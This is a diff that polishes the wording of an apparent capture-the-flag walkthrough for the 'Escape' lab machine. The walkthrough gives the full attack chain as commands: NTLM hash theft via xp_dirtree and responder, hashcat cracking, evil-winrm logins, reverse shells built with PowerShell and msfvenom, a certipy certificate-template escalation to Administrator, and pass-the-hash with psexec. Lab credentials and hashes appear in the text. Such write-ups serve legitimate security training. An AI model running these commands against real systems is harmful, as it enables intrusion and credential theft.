@@ -17,30 +17,30 @@ aliases:
 # Walkthrough
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
 ![](../../0.%20Assets/Escape-1788697224241.webp)
 
 
-Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-now we can go a bit deeper into each port this is the `nmap` command I used
+Now we can go a bit deeper on each port. This is the `nmap` command I used.
 
 ```
 nmap -sS -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49715 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
 ```
 
-And these are the results
+And these are the results.
 
 ```
 
@@ -169,11 +169,11 @@ And these are the results
 ─────┴─────────────────────────────────────────────────────────────────────────────
 ```
 
-We see `kerberos` and other `AD` related ports so it's quite safe to assume this is an `Active directory` 
+We see `kerberos` and other `AD`-related ports, so it's safe to assume this is an `Active Directory` environment.
 
-Let's start by enumerating shares
+Let's start by enumerating the shares.
 
-After some trial and error I found that the user `guest` does not only exist in the domain but also has read permissions in the shares:
+After some trial and error, I found that the `guest` user not only exists in the domain but also has read access to the shares:
 
 ```
 ┌─[bl1nk㉿kali]─[~/engagements/escape]─[󰦝 10.10.15.150]─[ 10.129.228.253]
@@ -191,17 +191,17 @@ SMB         10.129.228.253  445    DC               Public          READ
 SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
 ```
 
-And inside the `Public` folder we can find an interesting PDF 
+Inside the `Public` folder we find an interesting PDF.
 
 ![](../../0.%20Assets/Escape-1788697999913.webp)
 
-We will get it with
+Let's grab it with:
 
 ```
 get "SQL Server Procedures.pdf"
 ```
 
-And Inside we can find this 
+And inside it we find this.
 
 ![](../../0.%20Assets/Escape-1788698054399.webp)
 
@@ -210,37 +210,37 @@ And Inside we can find this
 | ---------- | ------------------- |
 | PublicUser | GuestUserCantWrite1 |
 
-So we have credentials for a `mssql` service which we happen to see on the output of `nmap`, so we connect.
+So we have credentials for the `mssql` service we spotted in the `nmap` output, so let's connect.
 
 ![](../../0.%20Assets/Escape-1788705588560.webp)
 
 
-One thing we can do in `mssql` is to try to pass commands to the server through the settings
+One thing we can try in `mssql` is passing commands to the server through its settings.
 
 ![|1067x443](../../0.%20Assets/Escape-1788705671891.webp)
 
-So let's try
+Let's try it.
 
 ```
 EXEC sp_configure 'show advanced options', '1'
 ```
 
-We are not allowed to do this operation, so let's try something different
+We aren't allowed to run that operation, so let's try something else.
 
 ```
 SQL (PublicUser  guest@master)> EXEC sp_configure 'show advanced options', '1'
 ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
 ```
 
-Let's try exploiting `xp_dirtree` to steal an `NTLMv2 hash` we will do this with `responder`
+Let's try abusing `xp_dirtree` to steal an `NTLMv2 hash`, using `responder` to capture it.
 
-We will start `responder` to capture the hash
+First, start `responder` to catch the hash.
 
 ```
 sudo responder -I tun0
 ```
 
-and in `mssql client` we will try to traverse with `xp_dirtree` to start a connection towards our kali and steal the hash with `responder`
+Then, from the `mssql client`, use `xp_dirtree` to force a connection back to our Kali box so `responder` can grab the hash.
 
 ```
 xp_dirtreee \\10.10.15.150\somepath
@@ -248,7 +248,7 @@ xp_dirtreee \\10.10.15.150\somepath
 
 ![](../../0.%20Assets/Escape-1788706356546.webp)
 
-And now we can try cracking this hash with hashcat
+Now we can try cracking the hash with hashcat.
 
 ```
 hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.228.253.txt /usr/share/wordlists/rockyou.txt
@@ -258,15 +258,15 @@ hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.228.253.txt /usr
 
 ![](../../0.%20Assets/Escape-1788706511235.webp)
 
-The cracked hash equals to `REGGIE1234ronnie`
+The cracked password is `REGGIE1234ronnie`.
 
 | User    | Password         |
 | ------- | ---------------- |
 | sql_svc | REGGIE1234ronnie |
 
-Let's see where this credentials are valid with `netexec`
+Let's see where these credentials are valid using `netexec`.
 
-we found that we are allowed to use `winrm` with the credentials we found so let's use `evil-winrm`
+We found we can use `winrm` with these credentials, so let's connect with `evil-winrm`.
 
 ```
 netexec winrm $T -u 'SQL_SVC' -p 'REGGIE1234ronnie'                                                                                             󰅗 2
@@ -274,23 +274,23 @@ WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019
 WINRM       10.129.228.253  5985   DC               [+] sequel.htb\SQL_SVC:REGGIE1234ronnie (Pwn3d!)
 ```
 
-- It says pwn3d
+- It reports pwn3d.
 
-This is the command  we will use to connect to `winrm` and we will do it by using `evil-winrm`
+This is the command we'll use to connect to `winrm` through `evil-winrm`.
 
 ```
 sudo evil-winrm -i $T -u sql_svc -p 'REGGIE1234ronnie'
 ```
 
-Once we connect through `winrm` we can send ourselves a reverse shell
+Once we're in through `winrm`, we can send ourselves a reverse shell.
 
-start a listener with `nc`
+Start a listener with `nc`.
 
 ```
 nc -nlvp 1337
 ```
 
-and from the `powershell` connection we have from `winrm` generate a payload like so
+And from the `powershell` session we have over `winrm`, generate a payload like this.
 
 https://www.revshells.com/
 
@@ -300,7 +300,7 @@ $LHOST = "10.10.15.150"; $LPORT = 1337; $TCPClient = New-Object Net.Sockets.TCPC
 
 ![](../../0.%20Assets/Escape-1788708236609.webp)
 
-I couldnt stabilaze the reverse shell so i created a reverse shell payload with msfvenom and runed it from the first reverse shell we had and it worked
+I couldn't stabilize the reverse shell, so I built a reverse shell payload with msfvenom and ran it from the first shell we had, which worked.
 
 ```
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.150 LPORT=1234 -f exe > reverse .exe
@@ -308,22 +308,22 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.150 LPORT=1234 -f exe 
 
 ![](../../0.%20Assets/Escape-1788709755924.webp)
 
-We will start a new listener, listening on the port of the payload, and this time with `rlwrap` to stabilize the `reverse shell`
+Let's start a new listener on the payload's port, this time wrapped in `rlwrap` to stabilize the `reverse shell`.
 
 ```
 rlwrap nc -lvpn 1234
 ```
 
-Once we have this running we run the `.exe` we created with `msfvenom` in the client (I forgot to say we sent it to the client first, I did this with the python module `http.server` and i downloaded the content with `iwr` in powershell)
+With that running, we execute the `.exe` we built with `msfvenom` on the target. I should mention we transferred it over first, using the Python `http.server` module and downloading it with `iwr` in PowerShell.
 
 ![](../../0.%20Assets/Escape-1788709764298.webp)
 
 
-I tried looking for the user flag and I found  in the `C:\` drive A folder called SQLServer where if you go into the Logs you can find this:
+Looking for the user flag, I found a folder called SQLServer in the `C:\` drive, and inside its Logs you can find this:
 
 ![](../../0.%20Assets/Escape-1788717830784.webp)
 
-Let's try the credentials with `netexec` in different services
+Let's test these credentials against different services with `netexec`.
 
 ```
 netexec winrm $T -u Ryan.Cooper -p NuclearMosquito3
@@ -331,8 +331,7 @@ netexec winrm $T -u Ryan.Cooper -p NuclearMosquito3
 
 ![](../../0.%20Assets/Escape-1788722656515.webp)
 
-Bingo!
-so let's connect with `evil-winrm`
+That worked, so let's connect with `evil-winrm`.
 
 ```
 evil-winrm -i $T -u "ryan.cooper" -p "NuclearMosquito3"
@@ -340,21 +339,21 @@ evil-winrm -i $T -u "ryan.cooper" -p "NuclearMosquito3"
 
 ![](../../0.%20Assets/Escape-1788722395731.webp)
 
-And in the desktop we have the user flag
+And on the desktop we have the user flag.
 
 ![](../../0.%20Assets/Escape-1788722449499.webp)
 
-After doing quite some enumeration for privilege escalation, I couldn't find much so I tried with `certpy` ->  [certipy-exploitation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
+After a fair bit of enumeration for privilege escalation, I couldn't find much, so I turned to `certipy` -> [certipy-exploitation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
 
 ```
 certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -stdout -vulnerable
 ```
 
-Because "Enrollee Supplies Subject" lets you set the **Subject Alternative Name**, you request a cert on that template and put **`administrator`** in the SAN. The CA happily signs it. That cert now says _you are Administrator_  and AD CS will authenticate it as such/
+Because "Enrollee Supplies Subject" lets you set the **Subject Alternative Name**, you can request a certificate on that template and put **`administrator`** in the SAN. The CA signs it without complaint. That certificate now effectively says _you are Administrator_, and AD CS will authenticate it as such.
 
 ![](../../0.%20Assets/Escape-1788724398286.webp)
 
-Cool, now we can request the certificate as if we where the administrator
+Now we can request the certificate as if we were the administrator.
 
 ```
 certipy-ad req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn administrator@sequel.htb
@@ -370,7 +369,7 @@ Authenticate with the cert to recover the target's NT hash **and** a Kerberos TG
 certipy-ad auth -pfx administrator.pfx -dc-ip $T
 ```
 
-In my case there was a SKEW in time to big so i used this command
+In my case the clock skew was too large, so I used this command.
 
 ```
 sudo ntpdate 10.129.228.253
@@ -384,7 +383,7 @@ sudo ntpdate 10.129.228.253
 Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 
-And then we will connect doing a `pass the hash` through `smb`
+Then we connect with a `pass the hash` over `smb`.
 
 ```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee administrator@$T
@@ -392,6 +391,6 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9
 
 ![](../../0.%20Assets/Escape-1788727010478.webp)
 
-And here is the flag
+And here's the flag.
 
 ![](../../0.%20Assets/Escape-1788727057368.webp)
